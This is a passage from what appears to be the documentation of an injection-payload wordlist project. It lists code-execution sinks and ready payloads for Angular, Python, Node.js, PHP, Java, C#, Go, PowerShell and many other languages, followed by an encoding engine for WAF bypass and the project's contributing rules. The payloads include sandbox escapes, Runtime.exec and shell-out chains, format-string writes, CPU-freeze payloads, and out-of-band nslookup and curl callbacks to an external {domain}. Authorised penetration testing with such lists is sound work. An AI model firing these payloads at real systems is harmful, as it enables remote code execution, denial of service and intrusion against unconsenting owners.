| **OOB** | `#{request.getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke(request.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"nslookup {domain}")}` |

#### Angular Expression Injection (Client-Side)
**Delimiters:** `{{expr}}`, `ng-bind="expr"`, `[innerHTML]="expr"`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{invalid()}}` (ReferenceError in sandbox) |
| **Math** | `{{7*191}}` → `1337` (Angular 1.x), `{{constructor.constructor('return 7*191')()}}` |
| **Timing** | `{{constructor.constructor('while(true){}')()}}` (DoS/freeze - client-side) |
| **OOB** | `{{constructor.constructor('fetch("http://{domain}")')()} }` (Angular 1.x sandbox escape) |

**Angular 1.x Sandbox Escapes:**
- `{{constructor.constructor('return this')()}}`
- `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}` 
- Varies by Angular version (1.0 through 1.5 all have different bypasses)

---

### 39. Code Injection (Per-Language)

Each language has its own code execution sinks, string delimiters, comment syntax, and breakout characters. Payloads must cover all four pillars per language.

#### Python
**Sinks:** `eval()`, `exec()`, `__import__()`, `compile()`, `execfile()` (Py2), `input()` (Py2), `os.system()`, `os.popen()`, `subprocess.call()`, `subprocess.Popen()`, `subprocess.check_output()`, `subprocess.run()`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `__import__("os").invalid()` (AttributeError), `1/0` (ZeroDivisionError), `eval("invalid(")` (SyntaxError) |
| **Math** | `7*191` → `1337`, `eval("7*191")`, `__import__("math").factorial(0)+1336`, `abs(-1337)` |
| **Timing** | `__import__("time").sleep(5)`, `eval("__import__('time').sleep(5)")`, `exec("import time;time.sleep(5)")` |
| **OOB** | `__import__("urllib.request").request.urlopen("http://{domain}")`, `__import__("os").system("nslookup {domain}")`, `__import__("subprocess").getoutput("curl http://{domain}")`, `__import__("socket").socket().connect(("{domain}",80))` |

**String Delimiters:** `'single'`, `"double"`, `'''triple single'''`, `"""triple double"""`, `r"raw"`, `b"bytes"`, `f"fstring {expr}"`
**Comments:** `#` (single line), `'''docstring'''` (not true comment but breaks parsing)
**Breakout Chars:** `'`, `"`, `\n`, `;`, `#`, `)`, `]`, `}`

#### JavaScript / Node.js
**Sinks:** `eval()`, `Function("code")()`, `setTimeout("code",0)`, `setInterval("code",0)`, `new Function("code")`, `vm.runInNewContext()`, `vm.runInThisContext()`, `vm.Script()`, `require('child_process').exec()`, `require('child_process').execSync()`, `require('child_process').spawn()`, `process.binding('spawn_sync')`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `invalid()` (ReferenceError), `JSON.parse("invalid")` (SyntaxError), `null.x` (TypeError) |
| **Math** | `7*191` → `1337`, `eval(7*191)`, `Math.abs(-1337)`, `parseInt("1337")` |
| **Timing** | `require('child_process').execSync('sleep 5')`, `(function(){var d=Date.now();while(Date.now()-d<5000){}})()`, `Atomics.wait(new Int32Array(new SharedArrayBuffer(4)),0,0,5000)` |
| **OOB** | `require('child_process').execSync('nslookup {domain}')`, `require('http').get('http://{domain}')`, `require('https').get('https://{domain}')`, `require('dns').resolve('{domain}',()=>{})`, `fetch('http://{domain}')` |

**String Delimiters:** `'single'`, `"double"`, `` `template ${expr}` ``
**Comments:** `//` (single line), `/* */` (multi-line)
**Breakout Chars:** `'`, `"`, `` ` ``, `\n`, `;`, `)`, `]`, `}`, `-->` (HTML comment in script), `</script>`

#### TypeScript
Same sinks as JavaScript plus:
**Additional Sinks:** `ts-node` eval, `transpileModule()` with eval, decorator injection
**Type System Abuse:** Type annotations can be stripped to reveal injected JS underneath. Same breakout as JS.

#### PHP
**Sinks:** `eval()`, `assert()` (PHP < 8.0), `preg_replace('/e')` (PHP < 7.0), `create_function()` (deprecated), `call_user_func()`, `call_user_func_array()`, `usort("code")`, `array_map()`, `array_filter()`, `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, `pcntl_exec()`, `dl()`, `include()`, `include_once()`, `require()`, `require_once()`, `file_get_contents()`, `fopen()`, `curl_exec()`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `invalid()` (Fatal error: Call to undefined function), `1/0` (DivisionByZeroError in PHP 8), `trigger_error("test")` |
| **Math** | `7*191` → `1337`, `eval("echo 7*191;")`, `abs(-1337)`, `intval("1337")` |
| **Timing** | `sleep(5)`, `usleep(5000000)`, `time_nanosleep(5,0)`, `eval("sleep(5);")`, `exec("sleep 5")` |
| **OOB** | `file_get_contents("http://{domain}")`, `curl_exec(curl_init("http://{domain}"))`, `exec("nslookup {domain}")`, `shell_exec("curl http://{domain}")`, `fopen("http://{domain}","r")`, `dns_get_record("{domain}")` |

**String Delimiters:** `'single'`, `"double $var"`, `<<<HEREDOC`, `<<<'NOWDOC'`
**Comments:** `//`, `#`, `/* */`
**Breakout Chars:** `'`, `"`, `;`, `?>` (close PHP tag), `\n`, `)`, `}`, `` ` ``
**PHP-Specific Wrappers:** `php://filter/convert.base64-encode/resource=`, `php://input`, `data://text/plain;base64,`, `expect://`

#### Ruby
**Sinks:** `eval()`, `send()`, `public_send()`, `instance_eval()`, `class_eval()`, `module_eval()`, `instance_exec()`, `Kernel.exec()`, `Kernel.system()`, `Kernel.spawn()`, `` `backticks` ``, `%x()`, `IO.popen()`, `Open3.capture3()`, `ERB.new().result`, `open()` (with pipe `|`)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `invalid_method` (NoMethodError), `1/0` (ZeroDivisionError), `Integer("invalid")` (ArgumentError) |
| **Math** | `7*191` → `1337`, `eval("7*191")`, `-1337.abs`, `(7*191).to_s` |
| **Timing** | `sleep(5)`, `` `sleep 5` ``, `system("sleep 5")`, `Kernel.sleep(5)` |
| **OOB** | `` `nslookup {domain}` ``, `system("curl http://{domain}")`, `require 'net/http'; Net::HTTP.get(URI('http://{domain}'))`, `require 'open-uri'; URI.open('http://{domain}')`, `exec("nslookup {domain}")` |

**String Delimiters:** `'single'`, `"double #{expr}"`, `%q(literal)`, `%Q(interpolated)`, `<<HEREDOC`, `<<~HEREDOC`
**Comments:** `#` (single line), `=begin`/`=end` (multi-line)
**Breakout Chars:** `'`, `"`, `#`, `\n`, `;`, `)`, `}`, `` ` ``

#### Java
**Sinks:** `Runtime.getRuntime().exec()`, `ProcessBuilder.start()`, `ScriptEngine.eval()` (Nashorn/GraalJS), `Class.forName().newInstance()`, `Method.invoke()`, `Constructor.newInstance()`, `ObjectInputStream.readObject()`, `XMLDecoder.readObject()`, `Expression.evaluate()` (EL), `OgnlUtil.getValue()` (OGNL), `SpelExpressionParser.parseExpression().getValue()` (SpEL)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `Class.forName("invalid.Class")` (ClassNotFoundException), `Integer.parseInt("invalid")` (NumberFormatException), `1/0` (ArithmeticException) |
| **Math** | `Runtime.getRuntime().exec("echo 1337")` (reflected), `T(java.lang.Math).abs(-1337)` (SpEL), `7*191` in EL/OGNL |
| **Timing** | `Thread.sleep(5000)`, `T(java.lang.Thread).sleep(5000)` (SpEL), `Runtime.getRuntime().exec("sleep 5")`, `TimeUnit.SECONDS.sleep(5)` |
| **OOB** | `Runtime.getRuntime().exec("nslookup {domain}")`, `new java.net.URL("http://{domain}").openStream()`, `T(java.lang.Runtime).getRuntime().exec("curl http://{domain}")`, `new ProcessBuilder("nslookup","{domain}").start()`, `InetAddress.getByName("{domain}")` |

**String Delimiters:** `"double"`, `"""text block"""` (Java 13+), `'char'` (single char only)
**Comments:** `//`, `/* */`, `/** javadoc */`
**Expression Languages:** `${...}` (JSP EL), `#{...}` (JSF EL), `%{...}` (OGNL), `T(...)` (SpEL)

#### Kotlin
**Sinks:** Same as Java plus: `ProcessBuilder`, `Runtime.exec()`, Kotlin scripting API `ScriptEngineManager`, `eval()` in Kotlin REPL/script contexts, `String.execute()` (extension functions in some frameworks)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `"invalid".toInt()` (NumberFormatException), `null!!` (NullPointerException) |
| **Math** | `7*191` → `1337`, `kotlin.math.abs(-1337)` |
| **Timing** | `Thread.sleep(5000)`, `kotlinx.coroutines.delay(5000)`, `Runtime.getRuntime().exec("sleep 5")` |
| **OOB** | `java.net.URL("http://{domain}").readText()`, `Runtime.getRuntime().exec("nslookup {domain}")`, `ProcessBuilder("curl","http://{domain}").start()` |

**String Delimiters:** `"double"`, `"""raw triple"""`, `"template ${expr}"`, `'char'` (single char)
**Comments:** `//`, `/* */`, `/** kdoc */`

#### Scala
**Sinks:** Same JVM sinks as Java/Kotlin plus: `scala.sys.process._` (`"cmd".!`, `"cmd".!!`, `Process("cmd").run()`), `scala.tools.nsc.interpreter`, `scala.reflect.runtime`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `"invalid".toInt` (NumberFormatException), `1/0` (ArithmeticException), `???.asInstanceOf[String]` (NotImplementedError) |
| **Math** | `7*191` → `1337`, `math.abs(-1337)` |
| **Timing** | `Thread.sleep(5000)`, `"sleep 5".!` (process execution) |
| **OOB** | `"nslookup {domain}".!`, `"curl http://{domain}".!!`, `scala.io.Source.fromURL("http://{domain}").mkString`, `new java.net.URL("http://{domain}").openStream()` |

**String Delimiters:** `"double"`, `"""triple"""`, `s"interpolated $expr"`, `f"formatted $expr%s"`, `raw"raw $expr"`, `'char'`
**Process Execution:** `import scala.sys.process._; "cmd".!` is idiomatic Scala command execution

#### C
**Sinks:** `system()`, `popen()`, `exec()` family (`execl`, `execv`, `execvp`, `execle`, `execve`), `dlopen()`, `dlsym()` (dynamic loading), `printf()` family (format strings)

| Pillar | Payload Syntax |
|---|---|
| **Error** | Buffer overflow / crash, format string `%s%s%s%s%s` (segfault on read), null pointer dereference |
| **Math** | Not typically injectable as "code" - C is compiled. Format string: `%d` leaking stack integers. Overflow: integer boundary `2147483647+1` |
| **Timing** | `system("sleep 5")`, `sleep(5)` (if injecting into compiled source), CPU-intensive payload via overflow-triggered loop |
| **OOB** | `system("nslookup {domain}")`, `system("curl http://{domain}")`, `popen("nslookup {domain}","r")` |

**Format String Specifiers:** `%x` (hex leak), `%s` (string/crash), `%n` (write), `%p` (pointer), `%d` (decimal), `%08x` (padded hex), `%hn` (short write), `%hhn` (byte write)
**Overflow Boundaries:** `2147483647` (INT_MAX), `-2147483648` (INT_MIN), `4294967295` (UINT_MAX), `65535` (USHRT_MAX), `127` (CHAR_MAX)
**String Terminators:** `\0` (null byte), `\n` (newline in gets/fgets)
**Breakout Chars:** `"`, `\0`, `%`, `\n`, `;`

#### C++
**Sinks:** Same as C plus: `std::system()`, `popen()`, `boost::process`, `QProcess` (Qt), `std::format()` (C++20 - format string potential), `cin >>` / `getline()` (buffer issues)

| Pillar | Payload Syntax |
|---|---|
| **Error** | Same as C - crash/segfault, `std::stoi("invalid")` (std::invalid_argument), `std::out_of_range` |
| **Math** | Same as C - compiled language, not typically eval'd. Stack leak via format strings |
| **Timing** | `system("sleep 5")`, `std::this_thread::sleep_for(std::chrono::seconds(5))` (source injection) |
| **OOB** | `system("nslookup {domain}")`, `system("curl http://{domain}")` |

**Additional C++ attack surface:** vtable corruption, use-after-free, double free, `std::string` buffer issues, template metaprogramming edge cases

#### C# / .NET
**Sinks:** `Process.Start()`, `System.Diagnostics.ProcessStartInfo`, `Assembly.Load()`, `Assembly.LoadFrom()`, `Activator.CreateInstance()`, `Type.InvokeMember()`, `DynamicInvoke()`, `CSharpScript.EvaluateAsync()` (Roslyn), `PowerShell.Create().AddScript()`, `XmlSerializer`, `BinaryFormatter.Deserialize()`, `JavaScriptSerializer`, `DataContractJsonSerializer`, `SqlCommand()` (SQLi sink), `String.Format()` (format string)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `Convert.ToInt32("invalid")` (FormatException), `int.Parse("invalid")`, `1/0` (DivideByZeroException), `Type.GetType("invalid")` returns null |
| **Math** | `7*191` → `1337` (in Razor/eval contexts), `Math.Abs(-1337)`, `{0}` format string index |
| **Timing** | `System.Threading.Thread.Sleep(5000)`, `Task.Delay(5000).Wait()`, `Process.Start("timeout","5")` |
| **OOB** | `new System.Net.WebClient().DownloadString("http://{domain}")`, `System.Net.Http.HttpClient.GetAsync("http://{domain}")`, `Process.Start("nslookup","{domain}")`, `System.Net.Dns.GetHostEntry("{domain}")` |

**String Delimiters:** `"double"`, `@"verbatim"`, `$"interpolated {expr}"`, `$@"verbatim interpolated"`, `"""raw string literal"""` (C# 11+), `'char'`
**Format String:** `String.Format("{0}", arg)` - `{0}`, `{1}`, `{0:X}` (hex), `{0:D10}` (padded)
**Comments:** `//`, `/* */`, `/// xml doc`

#### Go
**Sinks:** `os/exec.Command()`, `os/exec.CommandContext()`, `syscall.Exec()`, `text/template.Execute()` (unescaped!), `html/template.Execute()` (XSS-safe but not injection-safe), `plugin.Open()` (dynamic loading), `reflect.Value.Call()`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `{{.InvalidField}}` (template), `strconv.Atoi("invalid")` returns error, panic triggers (nil pointer, index out of range) |
| **Math** | Limited in templates - requires custom `FuncMap`. `exec.Command("expr","7","*","191").Output()` for OS-level |
| **Timing** | `exec.Command("sleep","5").Run()`, `time.Sleep(5 * time.Second)` (source injection) |
| **OOB** | `exec.Command("nslookup","{domain}").Run()`, `http.Get("http://{domain}")`, `net.Dial("tcp","{domain}:80")`, `net.LookupHost("{domain}")` |

**Template Injection:** `{{.}}` (dump all data), `{{printf "%v" .SecretField}}`, `{{call .Method args}}`
**String Delimiters:** `"double"`, `` `raw backtick` ``, `'rune'` (single char)
**Comments:** `//`, `/* */`

#### Rust
**Sinks:** `std::process::Command::new()`, `std::process::Command::output()`, `libc::system()` (unsafe FFI), `dlopen` (dynamic loading), proc macros (compile-time code gen)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `panic!("test")`, `.unwrap()` on `Err`, integer overflow in debug mode, `str::parse::<i32>("invalid")` |
| **Math** | Compiled - not typically eval'd. `format!` macro doesn't evaluate expressions. `Command::new("expr").args(&["7","*","191"]).output()` |
| **Timing** | `std::thread::sleep(Duration::from_secs(5))` (source), `Command::new("sleep").arg("5").status()` |
| **OOB** | `Command::new("nslookup").arg("{domain}").status()`, `reqwest::get("http://{domain}")`, `std::net::TcpStream::connect("{domain}:80")` |

**Note:** Rust's memory safety makes traditional buffer overflow injection nearly impossible. Attack surface is primarily in `unsafe` blocks, FFI, deserialization (serde), and process spawning.
**String Delimiters:** `"double"`, `r"raw"`, `r#"extended raw"#`, `b"bytes"`, `'char'`

#### Swift
**Sinks:** `Process()` / `NSTask` (macOS), `system()` (Darwin), `dlopen()`, `NSExpression`, `JSContext.evaluateScript()` (JavaScriptCore), `NSPredicate(format:)` (predicate injection)

| Pillar | Payload Syntax |
|---|---|
| **Error** | `fatalError("test")`, `Int("invalid")!` (force unwrap nil), `preconditionFailure()` |
| **Math** | `7*191` → `1337` in `NSExpression(format:"7*191").expressionValue(with:nil,context:nil)`, `JSContext().evaluateScript("7*191")` |
| **Timing** | `Thread.sleep(forTimeInterval: 5)`, `Process.launchedProcess(launchPath:"/bin/sleep",arguments:["5"])` |
| **OOB** | `Process.launchedProcess(launchPath:"/usr/bin/nslookup",arguments:["{domain}"])`, `URL(string:"http://{domain}").flatMap{try? Data(contentsOf:$0)}` |

**NSPredicate Injection:** `NSPredicate(format: "name == %@", userInput)` - if `format:` takes unsanitized input: `TRUEPREDICATE`, `SUBQUERY(...)`, `FUNCTION(...)` can escalate
**String Delimiters:** `"double"`, `"""multiline"""`, `"interpolated \(expr)"`, `#"extended #delimiter"#`

#### Perl
**Sinks:** `eval()`, `system()`, `exec()`, `` `backticks` ``, `qx()`, `open()` (with pipe `|cmd`), `do EXPR`, `require EXPR`, `use Module`, `IPC::Open2`, `IPC::Open3`, `IO::Socket`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `die("test")`, `eval("invalid(")` (syntax error), `warn("test")` |
| **Math** | `eval("7*191")` → `1337`, `7*191` in string interpolation |
| **Timing** | `sleep(5)`, `` `sleep 5` ``, `system("sleep 5")`, `select(undef,undef,undef,5)` |
| **OOB** | `` `nslookup {domain}` ``, `system("curl http://{domain}")`, `use LWP::Simple; get("http://{domain}")`, `use IO::Socket::INET; IO::Socket::INET->new("{domain}:80")`, `@{[system "nslookup {domain}"]}` |

**String Delimiters:** `'single'`, `"double $var"`, `qq(double)`, `q(single)`, `<<HEREDOC`, `<<'HEREDOC'`
**Breakout Chars:** `'`, `"`, `;`, `|`, `` ` ``, `\n`, `}`, `)`, `@{[...]}` (array dereference eval)
**Dangerous open():** `open(FH, "|cmd")` - pipe prefix triggers command execution

#### Lua
**Sinks:** `loadstring()` / `load()`, `dofile()`, `loadfile()`, `os.execute()`, `io.popen()`, `require()`, `debug.getinfo()`, `rawset()`, `rawget()`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `error("test")`, `assert(false)`, `loadstring("invalid(")()` (syntax error) |
| **Math** | `loadstring("return 7*191")()` → `1337`, `tonumber("1337")` |
| **Timing** | `os.execute("sleep 5")`, `local t=os.clock();while os.clock()-t<5 do end` (CPU burn) |
| **OOB** | `os.execute("nslookup {domain}")`, `os.execute("curl http://{domain}")`, `io.popen("nslookup {domain}"):read("*a")` |

**String Delimiters:** `'single'`, `"double"`, `[[long bracket]]`, `[=[level 1]=]`, `[==[level 2]==]`
**Comments:** `--` (single line), `--[[ ]]` (multi-line)

#### R
**Sinks:** `eval(parse(text=))`, `system()`, `system2()`, `shell()`, `source()`, `do.call()`, `Sys.setenv()`, `.Internal()`, `.Primitive()`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `stop("test")`, `as.integer("invalid")` (warning + NA), `1/0` (Inf) |
| **Math** | `eval(parse(text="7*191"))` → `1337`, `abs(-1337)` |
| **Timing** | `Sys.sleep(5)`, `system("sleep 5")` |
| **OOB** | `system("nslookup {domain}")`, `readLines("http://{domain}")`, `download.file("http://{domain}","/dev/null")`, `httr::GET("http://{domain}")` |

#### PowerShell
**Sinks:** `Invoke-Expression` (`iex`), `& $cmd`, `. $script`, `Start-Process`, `[ScriptBlock]::Create()`, `New-Object`, `Add-Type`, `Invoke-Command`, `Invoke-WebRequest`, `Invoke-RestMethod`

| Pillar | Payload Syntax |
|---|---|
| **Error** | `throw "test"`, `[int]"invalid"` (InvalidArgument), `1/0` (RuntimeException) |
| **Math** | `7*191` → `1337`, `iex "7*191"`, `[math]::Abs(-1337)` |
| **Timing** | `Start-Sleep -Seconds 5`, `sleep 5`, `[System.Threading.Thread]::Sleep(5000)` |
| **OOB** | `Invoke-WebRequest "http://{domain}"`, `(New-Object Net.WebClient).DownloadString("http://{domain}")`, `Resolve-DnsName {domain}`, `nslookup {domain}`, `Test-NetConnection {domain} -Port 80` |

**String Delimiters:** `'literal'`, `"expandable $var"`, `@'here-string'@`, `@"expandable here"@`
**Comments:** `#`, `<# block #>`
**Breakout Chars:** `'`, `"`, `;`, `|`, `\n`, `)`, `}`, `` ` `` (escape char in PS)

---

### 40. Fuzzing / Edge Case Payloads

**Universal Probes:**
- `${{<%[%'"}}%\` - template engine polyglot probe
- Null bytes, special characters, Unicode edge cases
- `undefined`, `null`, `nil`, `None`, `NIL`, `(null)`, `true`, `false`, `NaN`, `Infinity`
- `hasOwnProperty` (prototype chain interference)
- Extremely long strings (buffer testing)
- Empty strings, whitespace-only strings
- Type juggling probes (`0`, `"0"`, `""`, `[]`, `{}`, `0.0`)
- Negative numbers, float precision edges
- XML/HTML entity edge cases
- Emoji / multi-byte character boundary testing

---

## Payload List Structure - Five Lists Per Pillar

The raw payload corpus is split into **5 lists** based on detection pillar. Each list contains ONLY payloads designed to trigger that specific detection method. The **full** list is the union of all four pillar lists plus general-purpose probes.

| List | What It Contains | When To Use |
|---|---|---|
| **full** | Everything - all pillars combined + general probes, fuzzing, edge cases | Comprehensive scan, don't care about speed |
| **math** | Only payloads that produce `1337` or `7331` in reflected output | Target reflects input / shows query results. Grep response for canary. |
| **error** | Only payloads designed to trigger verbose errors, stack traces, parser failures | Target shows error messages. Grep for error signatures (see `Errors.txt`). |
| **timing** | Only payloads that cause measurable delay (`sleep`, `WAITFOR`, CPU burn, etc.) | Completely blind - no output, no errors. Measure response time delta. |
| **oob** | Only payloads that force external callbacks (DNS, HTTP, etc. to `{domain}`) | Blind + async - no output, no errors, timing unreliable. Watch callback catcher. |

### File Layout

Both `full/` and `minimal/` share identical structure. Generated by `payloadctl dist`:

```
payloads/lists/
├── full/                          # 1,324 payloads
│   ├── master.txt                 # All payloads with ## headers
│   ├── payloads-only.txt          # Raw lines (for Burp Intruder)
│   ├── by-category/               # 20 category files (sqli.txt, ssti.txt, ...)
│   ├── by-pillar/                 # error.txt, math.txt, timing.txt, oob.txt, reflected.txt
│   │   ├── error.txt              # Headers + payloads
│   │   ├── error-payloads-only.txt # Raw lines only
│   │   └── ...
│   └── encoded/                   # 7 encodings, each with payloads.txt
│       ├── url-encoded/payloads.txt
│       ├── double-url-encoded/payloads.txt
│       ├── base64/payloads.txt
│       ├── json-safe/payloads.txt
│       ├── html-entity/payloads.txt
│       ├── hex-escaped/payloads.txt
│       └── unicode-escaped/payloads.txt
└── minimal/                       # 82 payloads (same structure)
    ├── master.txt
    ├── payloads-only.txt
    ├── by-category/
    ├── by-pillar/
    └── encoded/
```

---

## Encoding Engine

The encoding engine takes the raw payload lists and produces encoded variants for every delivery context automatically. **You write payloads once in raw form. The engine generates all encoded versions.**

Raw source files are the single source of truth. Encoded variants in `lists/full/encoded/` and `lists/minimal/encoded/` are generated artifacts, not manually maintained. Run `payloadctl dist` to regenerate.

### Encoding Formats

| Format | What It Encodes | Use Case |
|---|---|---|
| **raw** | Nothing - original payload as-is | Query string values, form fields, plain text inputs |
| **url-encoded** | `%XX` for non-alphanumeric chars | URL parameters, path segments, cookie values |
| **double-url-encoded** | `%25XX` (encode the `%` too) | WAF bypass, double-decode bugs, proxy chains |
| **json-safe** | Escape `"`, `\`, control chars (`\n`→`\\n`, `\t`→`\\t`), ensure valid inside JSON string | JSON API request bodies, REST APIs, GraphQL variables |
| **xml-safe** | `<`→`&lt;`, `>`→`&gt;`, `&`→`&amp;`, `"`→`&quot;`, `'`→`&apos;` | XML/SOAP/SAML request bodies, XML attributes |
| **html-entity-encoded** | `<`→`&lt;`, `"`→`&#34;`, `'`→`&#39;`, named + numeric entities | HTML attribute injection, innerHTML contexts |
| **unicode-escaped** | Non-ASCII → `\uXXXX` | JavaScript string contexts, JSON with strict ASCII |
| **hex-escaped** | Non-alphanumeric → `\xXX` | JavaScript strings, C strings, regex contexts |
| **base64** | Full payload base64 encoded | Deserialization payloads, JWT payloads, `data:` URI, `php://filter` |
| **utf-7** | UTF-7 encoding (`+ADw-` for `<`, etc.) | XXE with UTF-7, older IE XSS, email injection |
| **utf-16** | UTF-16 encoding | XXE parser bypass, BOM-based confusion |

### Engine Script Interface

```bash
# Generate all encoded variants, category splits, and pillar splits
./tools/payloadctl dist

# Full workflow: rebuild master list then generate distribution
./tools/payloadctl build
./tools/payloadctl dist
```

### Engine Implementation

The encoding engine is built into `tools/cmd_dist.py` with no external dependencies (stdlib only). Each encoding format is a pure function: `str -> str`. The engine:

1. Reads each line from each raw pillar list
2. Skips comment/header lines (starting with `##`)
3. Applies the encoding function
4. Writes to the output subdirectory, preserving `##` headers as-is (so section structure is maintained in encoded files)
5. Deduplicates - if encoding produces the same output as raw (e.g., a pure-alphanumeric payload URL-encodes to itself), it's still included for completeness

### Encoding Functions (Core Logic)

```python
def url_encode(payload: str) -> str:
    """Percent-encode everything except unreserved chars (RFC 3986)."""
    return urllib.parse.quote(payload, safe='')

def double_url_encode(payload: str) -> str:
    """URL-encode, then URL-encode the result again."""
    return urllib.parse.quote(urllib.parse.quote(payload, safe=''), safe='')

def json_safe(payload: str) -> str:
    """Make payload safe to embed inside a JSON string value (between double quotes)."""
    return payload.replace('\\', '\\\\').replace('"', '\\"').replace('\n', '\\n').replace('\r', '\\r').replace('\t', '\\t').replace('\0', '\\u0000')

def xml_safe(payload: str) -> str:
    """Escape XML special chars."""
    return payload.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;').replace("'", '&apos;')

def html_entity_encode(payload: str) -> str:
    """Encode to HTML numeric entities for non-alphanumeric chars."""
    return ''.join(c if c.isalnum() else f'&#{ord(c)};' for c in payload)

def unicode_escape(payload: str) -> str:
    """Encode non-ASCII to \\uXXXX."""
    return payload.encode('unicode_escape').decode('ascii')

def hex_escape(payload: str) -> str:
    """Encode non-alphanumeric to \\xXX."""
    return ''.join(c if c.isalnum() else f'\\x{ord(c):02x}' for c in payload)

def base64_encode(payload: str) -> str:
    """Base64 encode the entire payload."""
    import base64
    return base64.b64encode(payload.encode()).decode()
```

### Idempotency Rule

Raw lists are the **source of truth**. Encoded directories are generated output. They should be:
- Listed in `.gitignore` (or generated at build time)
- OR committed as convenience artifacts with a CI check that they match what the engine produces

The project can choose either approach, but raw lists must never be auto-generated from encoded ones - the data flows one direction only: **raw → encoded**.

---

## Current Coverage Assessment

### Well-Covered:
- SQL Injection (MySQL, MSSQL, PostgreSQL, Oracle, SQLite) - time-based focus
- OS Command Injection (Linux + Windows, multiple shells, multiple operators)
- Code Injection (Python, Node.js, PHP, Ruby, Java, .NET, Perl)
- SSTI (Jinja2, Mako, Freemarker, Velocity, Handlebars, Thymeleaf, ERB, Twig, Smarty, SpEL, Pebble)
- XSS (polyglots, multiple contexts, filter evasion, blind callbacks)
- XXE (classic, XInclude, blind/OOB)
- SSI / ESI Injection
- Path Traversal (Linux, Windows, encoding variants, null byte, `/;/`, `/.;/`)
- SSRF (cloud metadata - AWS, GCP, Azure, multiple IP formats)
- NoSQL Injection (MongoDB operators, DynamoDB)
- Deserialization (ysoserial gadget probing)
- Information Disclosure (error strings, env var extraction)
- Cloud credential harvesting (AWS, GCP, Azure env vars)
- Format string basics
- CRLF injection

### Needs Expansion:
- LDAP Injection
- GraphQL-specific payloads
- JWT attack payloads (`alg:none`, `kid` injection)
- Prototype Pollution payloads
- WebSocket-specific payloads
- HTTP Request Smuggling payloads
- Race condition payloads
- Web LLM / Prompt Injection payloads
- CORS misconfiguration probes
- Cache poisoning / cache deception payloads
- OAuth attack payloads
- XSLT injection payloads
- ReDoS payloads
- More format string depth (`%n`, `%p`, pointer walking)
- Integer overflow / boundary payloads
- More file upload bypass payloads
- Business logic / type juggling probes
- DOM clobbering payloads
- Expression Language (OGNL, MVEL) depth
- API-specific (mass assignment, HPP, method override)

---

## Contributing Principles

1. **Polyglot first** - Can this payload be combined with others into a single string that fires in multiple contexts? If yes, do that.
2. **Four pillars per class** - Every injection class MUST have payloads in all four pillar lists: math, error, timing, and OOB. If you add a new payload, put it in the correct pillar list(s). The full list is generated as the union of all four.
3. **Write raw, encode automatically** - Only add payloads to the raw lists. Never manually maintain encoded variants. Run the encoding engine to generate URL-safe, JSON-safe, XML-safe, etc. versions.
4. **OS parity** - Every OS command payload needs Linux AND Windows variants.
5. **Context breakout** - Payloads should include quote/comment/tag breakers to escape the most common wrapping contexts.
6. **Canary consistency** - All math payloads MUST resolve to `1337` or `7331`. No other magic numbers.
7. **Test before committing** - Run payloads against the relevant testbed Docker stack to confirm they fire. A payload that doesn't trigger in the testbed doesn't belong in the list.
